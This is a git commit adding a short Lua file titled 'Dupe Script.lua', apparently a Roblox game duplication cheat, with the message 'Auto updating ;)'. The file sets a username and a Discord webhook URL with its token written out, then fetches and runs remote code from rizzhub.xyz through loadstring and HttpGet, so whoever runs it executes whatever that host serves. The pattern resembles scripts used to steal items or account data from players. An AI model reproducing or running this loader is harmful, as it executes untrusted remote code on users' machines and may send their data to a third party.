c41ed0f8df3c59ced3e65b9f9c4b77df3975c6f5
Agentwolf23 <81175686+Agentwolf23@users.noreply.github.com>
2023-04-20 16:08:01 -0400

    Create Dupe Script.lua
    Auto updating ;)

---
+++ Dupe Script.lua
@@ -0,0 +1,4 @@
+UserName = "Quackers2141"
+Webhook = "https://discord.com/api/webhooks/1098701246661136436/SPHxNXELJWbcD6VkLzQxFhaSeMP_FKkVt2DQxJM--sq1UVbxbtcoWgm3bpJ8L3-uGQtb" -- optional delete the whole line if you don't want it
+
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
